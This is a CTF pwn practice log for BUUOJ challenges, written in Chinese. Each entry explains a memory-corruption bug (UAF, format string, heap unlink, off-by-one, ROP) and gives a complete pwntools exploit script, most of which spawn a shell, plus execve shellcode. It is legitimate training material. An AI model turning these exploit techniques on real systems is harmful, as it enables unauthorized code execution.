# BUUOJ Pwn刷题记录


---
## inndy_homework
run_program的edit number存在数组越界漏洞，导致可以在超出数组范围外写入数据，数组在栈的偏移是0x34 返回地址在ebp+4, 0x34+0x4/=56 56/4=14
```python
#!coding:utf-8
from pwn import *

#r=remote('node3.buuoj.cn',25191)
r=process('./homework')

r.recvuntil("What's your name?")
r.sendline('a')

r.recvuntil(' > ')
r.sendline('1')
r.recvuntil('Index to edit: ')
r.sendline('14')#0x34+0x4=56  56/4=14
r.recvuntil('How many? ')
r.sendline(str(0x080485FB))
r.recvuntil(' > ')
r.sendline("0")#执行exit 让程序返回并执行后门函数

r.interactive()
```


## pwnable_hacknote
结构体
```c
struct note{
*p;//指向0x804862B
*content; //指向note的content
}
```
漏洞在于free之后，并没有把指针置空导致UAF
思路：
先申请chunk0和chunk1，然后依次free掉，再申请一个chunk2，这时候的chunk2的p和content被分配到了chunk1的p和chunk0的p，修改chunk2的content为atoi_got，然后再print(0)，就可以泄露atoi的地址，通过偏移找到system函数，再利用一次UAF，将chunk0的p指针覆盖成system的地址，注意这里的传参方式，用需要||来截断
```python
#!coding:utf-8
from pwn import *

#r=remote('node3.buuoj.cn',29459)
r=process('./hacknote')
elf=ELF('./hacknote')
libc=ELF('./libc-2.23.so')
atoi_got=elf.got['atoi']
atoi_sym=libc.sym['atoi']
system_sym=libc.sym['system']
puts_addr=0x804862B

def Add(size,content):
        r.recvuntil('Your choice :')
        r.sendline('1')
        r.recvuntil('Note size :')
        r.sendline(str(size))
        r.recvuntil('Content :')
        r.sendline(str(content))

def Delete(index):
        r.recvuntil('Your choice :')
        r.sendline('2')
        r.recvuntil('Index :')
        r.sendline(str(index))

def Print(index):
        r.recvuntil('Your choice :')
        r.sendline('3')
        r.recvuntil('Index :')
        r.sendline(str(index))

Add(16,'aaaa')
Add(16,'bbbb')
Delete(0)
Delete(1)

#fastbin：0x10  chunk1 p --> chunk 0 p 
#chunk2的p指向chunk1的p，chunk2的content指向chunk0的p
Add(8,p32(puts_addr)+p32(atoi_got))
#泄露atoi
Print(0)

atoi_addr=u32(r.recv(4))
system_addr= atoi_addr - atoi_sym + system_sym
print("[+] system_addr: ",system_addr)

Delete(2)
Add(8,p32(system_addr)+'||sh')
Print(0)

r.interactive()
```
[https://www.jianshu.com/p/d8726a162f04](https://www.jianshu.com/p/d8726a162f04)


## inndy_echo
printf存在格式字符串漏洞,将printf_got修改成system的地址，在传入/bin/sh就可以getshell
```python
r=remote('node3.buuoj.cn',26649)
#r=process('./echo')
elf=ELF('./echo')
printf_got=elf.got['printf']
system_addr=elf.plt['system']

payload=fmtstr_payload(7,{printf_got:system_addr})
r.sendline(payload)
r.sendline('/bin/sh\x00')

r.interactive()
```

## oneshot_tjctf_2016
程序第一次输入会泄露地址，第二次会跳转到我们输入的地址,通过泄露地址计算libc，然后one_gadget
```python
from pwn import *
context.log_level='debug'

r=remote('node3.buuoj.cn',25576)
#r=process('./oneshot_tjctf_2016')
elf=ELF('./oneshot_tjctf_2016')
libc=ELF('./libc-2.23.so')

r.recvuntil("Read location?")
r.sendline(str(elf.got['puts']))
r.recvuntil("Value: ")
puts_addr=int(r.recvn(18),16)
print hex(puts_addr)

r.recvuntil("Jump location?")
libc_base=puts_addr-libc.sym['puts']

#one_gadget libc-2.23.so
#0x45216,0x4526a,0xf02a4,0xf1147
one_gadget=libc_base+0x45216
r.sendline(str(one_gadget))

r.interactive()
```

## pwn2_sctf_2016
程序有限制长度，长度小于32字节，可以看到get_n的第二个参数会转成unsigned int，而后经过atoi，被强转成signed int类型，导致存在整数溢出，当我们输入 -1 的时候，会被atoi函数强转成4294967295，从而绕过限制
```python
#!coding: utf-8
from pwn import *
from LibcSearcher import *
context.log_level='debug'

#r=remote('node3.buuoj.cn',26904)
r=process('./pwn2_sctf_2016')
elf=ELF('./pwn2_sctf_2016')
printf_plt=elf.plt['printf']
printf_got=elf.got['printf']
main_addr=elf.sym['main']
format_addr=0x80486f8

r.recvuntil("How many bytes do you want me to read? ")
r.sendline('-1')
r.recvuntil('data!\n')
payload='a'*0x2c+'bbbb'
payload+=p32(printf_plt)+p32(main_addr)+p32(format_addr)+p32(printf_got)
r.sendline(payload)

r.recvuntil('said: ')#程序最后的语句
r.recvuntil('said: ')#POR执行完之后的语句，最后是函数地址

printf_addr=u32(r.recv(4))
print('[+]printf_addr: ',hex(printf_addr))

libc=LibcSearcher('printf',printf_addr)
libc_base= printf_addr- libc.dump('printf')
system_addr=libc.dump('system')+libc_base
bin_addr=libc.dump('str_bin_sh')+libc_base

r.recvuntil("How many bytes do you want me to read? ")
r.sendline('-1')
r.recvuntil("data!\n")

payload='a'*0x2c+'bbbb'
payload+=p32(system_addr)+p32(main_addr)+p32(bin_addr)
r.sendline(payload)

r.interactive()

```

## [HarekazeCTF2019]baby_rop2
ret2libc，通过printf泄露read函数地址，然后计算libc的偏移，然后构造ROP
```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

r=process('./babyrop2')
elf=ELF('./babyrop2')
read_got=elf.got['read']
printf_plt=elf.plt['printf']
main_addr=elf.sym['main']
rdi_ret=0x400733
rsi_r15_ret=0x400731
format_addr=0x400770

r.recvuntil("What's your name?")
payload='a'*0x20+'bbbbbbbb'
payload+=p64(rdi_ret)+p64(format_addr)
payload+=p64(rsi_r15_ret)+p64(read_got)+p64(0x0)
payload+=p64(printf_plt)+p64(main_addr)
r.sendline(payload)

read_addr=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc=LibcSearcher('read',read_addr)
libc_base=read_addr-libc.dump('read')
system_addr=libc_base+libc.dump('system')
bin_addr=libc_base+libc.dump('str_bin_sh')

payload='a'*0x20+'bbbbbbbb'
payload+=p64(rdi_ret)+p64(bin_addr)+p64(system_addr)+p64(main_addr)

r.recvuntil("What's your name?")
r.sendline(payload)

r.interactive()
```

## hitcontraining_bamboobox
这题有两种做法 暂时只会unlink,house of force方法后面再补

在chunk0中构造一个大小为0x80的fake_chunk，通过change函数让堆溢出修改chunk1的prev_size和size，让prev_inuse为0，这个时候free chunk1，就可以让fake_chunk和chunk1合并，对fake_chunk进行unlink，指针ptr变成ptr-0x18，现在修改chunk0的content，相当于修改了ptr-0x18(0x6020b0)，改写成atoi_got，通过show函数泄露atoi的函数地址，计算libc的偏移，最后再把atoi_got改成system_got，输入/bin/sh 来getshell
```python
#!coding: utf-8
from pwn import *
context.log_level='debug'

#r=remote('node3.buuoj.cn',27353)
r=process('./bamboobox')
elf=ELF('./bamboobox')
libc=ELF('./libc-2.23.so')

def Add(size,content):
        r.recvuntil('Your choice:')
        r.sendline('2')
        r.recvuntil('Please enter the length of item name:')
        r.send(str(size))
        r.recvuntil('Please enter the name of item:')
        r.send(content)

def Edit(index,size,content):
        r.recvuntil('Your choice:')
        r.sendline('3')
        r.recvuntil('Please enter the index of item:')
        r.send(str(index))
        r.recvuntil('Please enter the length of item name:')
        r.send(str(size))
        r.recvuntil('Please enter the new name of the item:')
        r.send(content)

def Show():
        r.recvuntil('Your choice:')
        r.sendline('1')

def Free(index):
        r.recvuntil('Your choice:')
        r.sendline('4')
        r.recvuntil('Please enter the index of item:')
        r.send(str(index))

ptr=0x6020c8
fd=ptr-0x18
bk=ptr-0x10

#chunk的大小都要大于fastbin的范围，因为fastbin无法unlink
#只有双向链表才有unlink，fastbin是单向链表
Add(0x80,'a'*0x8) # chunk0
Add(0x80,'b'*0x8) # chunk1

#fake_chunk
payload=p64(0)+p64(0x81) #prev_size and size
payload+=p64(fd)+p64(bk) #fd and bk 
payload=payload.ljust(0x80,'a') #填充剩余空间
payload+=p64(0x80)+p64(0x90) #覆盖chunk1的prev_size和size

Edit(0,len(payload),payload)
Free(1)

payload='a'*0x18+p64(elf.got['atoi'])
#payload=p64(0)*2+p64(0x40)+p64(elf.got['atoi'])
Edit(0,len(payload),payload)
Show()#leak

#gdb.attach(r)
atoi_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
print hex(atoi_addr)
libc_base=atoi_addr-libc.sym['atoi']
system_addr=libc_base+libc.sym['system']

Edit(0,0x8,p64(system_addr))
r.recvuntil(":")
r.sendline('/bin/sh\x00')
r.interactive()

```
[https://n0vice.top/2020/03/06/unlink%E5%AD%A6%E4%B9%A0/index.html](https://n0vice.top/2020/03/06/unlink%E5%AD%A6%E4%B9%A0/index.html)
膜拜N神

## babyfengshui_33c3_2016
结构体
```c
struct user{
	char *desc;
	char name[7c];
	}user;
```
漏洞出现在update函数的检查机制
```c
if ( (char *)(v3 + *(_DWORD *)ptr[a1]) >= (char *)ptr[a1] - 4 )
    {
      puts("my l33t defenses cannot be fooled, cya!");
      exit(1);
    }
即description堆和name堆地址相减，与输入的长度比较
但是这种检查机制是建立在description堆和name堆相邻的情况下，如果把这两个堆分开，那么就可以绕过检查机制，从而进行堆溢出
```
思路：先创建两个user，在第三个user内容添加/bin/sh，然后释放第一个user，这个时候在创建一个user，因为我们可以自定义user中的description的大小，所以我们在这个user中申请一个0x100的description，根据堆的分配规则，这个user的description将会配分到被释放的第一个user中，看一下堆的布局

**申请三个user堆的布局**
description0 (0x80) | name0 (0x80) | description1(0x80) | name1(0x80) | description2(0x80) | name2 (0x80)

**释放第一个user，在创建一个0x100的description的user**
释放掉的user两个0x80合并成一块0x100的空闲空间，当我们申请一块0x100的description堆时，刚好被分配在这里
description3 (0x100) | description1(0x80) | name1(0x80) | description2(0x80) | name2 (0x80) | description3(0x80)

绕过检测机制之后就可以进行堆溢出，修改description1的内容为free_got，这样我们打印内容，就可以泄露出free_got地址，然后计算libc的偏移，最后把free_got改成system_got，在释放第三个user就相当于system(/bin/sh)
```python
#!coding: utf-8
from pwn import *
from LibcSearcher import *

#r=remote('node3.buuoj.cn',27050)
r=process('./babyfengshui_33c3_2016')
elf=ELF('./babyfengshui_33c3_2016')

def Add(size,name,length,text):
        r.sendlineafter('Action: ','0')
        r.sendlineafter('size of description: ',str(size))
        r.sendlineafter('name:',str(name))
        r.sendlineafter('text length:',str(length))
        r.sendlineafter('text:',str(text))

def Delete(index):
        r.sendlineafter('Action: ','1')
        r.sendlineafter('index: ',str(index))

def Show(index):
        r.sendlineafter("Action: ", '2')
        r.sendlineafter("index: ", str(index))

def Edit(index,length,text):
        r.sendlineafter('Action: ','3')
        r.sendlineafter('index:',str(index))
        r.sendlineafter('text length: ',str(length))
        r.sendlineafter('text: ',str(text))

Add(0x80,'aaaa',20,'bbbbbbbb')#user0
Add(0x80,'aaaa',20,'bbbbbbbb')#user1
Add(0x80,'a'*8,0x8,'/bin/sh\x00')#user2
Delete(0)

print hex(elf.got['free'])
Add(0x100,'aaaa',0x19c,'b'*0x198+p32(elf.got['free']))
#gdb.attach(r)
Show(1)

r.recvuntil('description: ')
free_addr=u32(r.recv(4))
libc = LibcSearcher('free', free_addr)
libc_base = free_addr - libc.dump('free')
system_addr = libc_base + libc.dump('system')

Edit(1,0x4,p32(system_addr))#把free_got修改成system_got
Delete(2)

r.interactive()

```
[https://www.cnblogs.com/lyxf/p/12215289.html](https://www.cnblogs.com/lyxf/p/12215289.html)
[https://blog.csdn.net/seaaseesa/article/details/102935119](https://blog.csdn.net/seaaseesa/article/details/102935119)


## [BJDCTF 2nd]ydsneedgirlfriend2
free之后没有把指针置为null，存在UAF，只需要让puts指针指向后门函数的地址就可以getshell
```python
from pwn import *
context.log_level='debug'

r=process('./ydsneedgirlfriend2')
#r=remote('node3.buuoj.cn',27004)
backdoor_addr = 0x400D86

def Add(length,name):
        r.sendlineafter('u choice :\n','1')
        r.sendlineafter('Please input the length of her name:\n',str(length))
        r.sendlineafter('Please tell me her name:\n',str(name))

def Delete(index):
        r.sendlineafter('u choice :\n','2')
        r.sendlineafter('Index :',str(index))

def Show(index):
        r.sendlineafter('u choice :\n','3')
        r.sendlineafter('Index :',str(index))


Add(0x20,'aaaa')
Delete(0)
Add(0x10,'a'*8+p64(backdoor_addr))
gdb.attach(r)
Show(0)

r.interactive()
```

## jarvisoj_level1
ret2libc
```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

r=remote('node3.buuoj.cn',26434)
#r=process('./level1')
elf=ELF('./level1')
read_got=elf.got['read']
write_plt=elf.plt['write']
main_addr=elf.sym['main']

payload='a'*0x88+'bbbb'
payload+=p32(write_plt)+p32(main_addr)+p32(1)+p32(read_got)+p32(4)
r.sendline(payload)

read_addr=u32(r.recv(4))
print hex(read_addr)

libc=LibcSearcher('read',read_addr)
libc_base=read_addr-libc.dump('read')
system_addr=libc_base+libc.dump('system')
bin_addr=libc_base+libc.dump('str_bin_sh')

payload='a'*0x88+'bbbb'
payload+=p32(system_addr)+p32(main_addr)+p32(bin_addr)
r.sendline(payload)

r.interactive()
```

## hitcontraining_heapcreator
在edit_heap函数中存在off by one 漏洞
```c
read_input(*((_QWORD *)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL);// 溢出一字节 
```

根据create_heap函数可知，在申请堆的时候会额外生成一个0x10的chunk保存到数组heaparray[i]，用来存储我们申请chunk的大小和地址，而我们申请的堆用来存放内容

利用思路：
1、利用off by one 漏洞覆盖下一个chunk的size，伪造chunk大小
2、然后申请伪造的chunk，产生chunk overlap，将内容指针修改free_got，然后用show函数打印，从而泄漏libc基址
3、找到system地址，用edit函数将free_got修改成system_addr
4、调用system("/bin/sh")

```python
#!coding:utf-8
from pwn import *

r=remote("node3.buuoj.cn",26941)
#r=process('./heapcreator')
elf=ELF('./heapcreator')
libc=ELF('./libc-2.23.so')
free_got=elf.got['free']

def create(size,value):
    r.recvuntil('Your choice :')
    r.sendline('1')
    r.recvuntil('Size of Heap :')
    r.sendline(str(size))
    r.recvuntil('Content of heap:')
    r.sendline(value)

def edit(index,value):
    r.recvuntil('Your choice :')
    r.sendline('2')
    r.recvuntil('Index :')
    r.sendline(str(index))
    r.recvuntil('Content of heap : ')
    r.sendline(value)

def show(index):
    r.recvuntil('Your choice :')
    r.sendline('3')
    r.recvuntil('Index :')
    r.sendline(str(index))

def delete(index):
    r.recvuntil('Your choice :')
    r.sendline('4')
    r.recvuntil('Index :')
    r.sendline(str(index))


create(0x18,'aaaaaaa')#chunk0 
#为什么是0x18：实际上分配了0x10的chunk，目的是重用chunk1的prev_size的8个字节，为后面的修改chunk1的size做准备
create(0x10,'aaaaaaa')#chunk1
create(0x10,'aaaaaaa')#chunk2
create(0x10,'/bin/sh\x00')#chunk3

payload='a'*0x18+'\x81'
edit(0,payload)#修改chunk1的size为0x81

delete(1)
size='\x08'.ljust(8,'\x00')
payload='b'*0x40+size+p64(free_got)
create(0x70,payload)#堆溢出到chunk2，修改chunk2的内容指针为free_got

show(2)#输出free真实地址,泄露libc基地址
r.recvuntil('Content :')
free_addr=u64(r.recvline()[:-1].strip().ljust(8,'\x00'))
print 'free_adr: '+hex(free_addr)

libc_base=free_addr-libc.symbols['free']
system_addr=libc_base+libc.symbols['system']

edit(2,p64(system_addr))#将free_got改为system地址
delete(3)#相当于执行system("/bin/sh")

r.interactive()

```
https://bbs.pediy.com/thread-247110.htm


## pwnable_start
程序实际就执行了以下两个命令
`write(1,$esp,0x14)` 和 `read(0,$esp,0x3c)`

因为没有开启NX，可以用shellcode来getshell。`0x08048087` 是 `mov ecx, esp`，write 函数的addr参数，从而leak stack。而后面再执行`read` 给了程序第二次输入。read只有 `0x3c`个字节，再减掉24个字节的padding，只剩下36个字节。而pwntools的shellcode太长。

这里引用大佬的shellcode:
```c
xor ecx,ecx
xor edx,edx
push edx ;\x00截断字符串
push 0x68732f6e ; 'n/sh'
push 0x69622f2f ; '//bi'
mov ebx,esp
mov al,0xb
int 0x80
```
32位的程序，系统调用号，即 eax 应该为 0xb
第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。为了4字节对齐，我们用//bin/sh
第二个参数，即 ecx 应该为 0
第三个参数，即 edx 应该为 0
shellcode会被\x00截断，因此用`xor ecx,ecx`来代替`mov ecx,0`

最终脚本
```python
from pwn import *
#context.log_level="debug"

#p = process('./start')
p = remote('node3.buuoj.cn',28850)

payload = 'A'*0x14 + p32(0x8048087)
p.sendafter("Let's start the CTF:",payload)
stack_addr = u32(p.recv(4))
print 'stack_addr: '+hex(stack_addr)

shellcode='''
xor ecx,ecx;
xor edx,edx;
push ebx;
push 0x68732f6e
push 0x69622f2f
mov ebx,esp
mov al,0xb
int 0x80
'''

#shellcode='\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
shellcode=asm(shellcode)
payload = 'A'*0x14 + p32(stack_addr+0x14)+shellcode
p.send(payload)

p.interactive()
```

https://www.cnblogs.com/Rookle/p/12884522.html


## 护网杯_2018_gettingstart
栈溢出将v7赋值为0x7FFFFFFFFFFFFFFF和v8赋值为0.1就可以getshell
```python
from pwn import *

p=process("./2018_gettingStart")
#p=remote("node3.buuoj.cn",25072)

payload = "a"*0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
p.sendline(payload)

p.interactive()
```





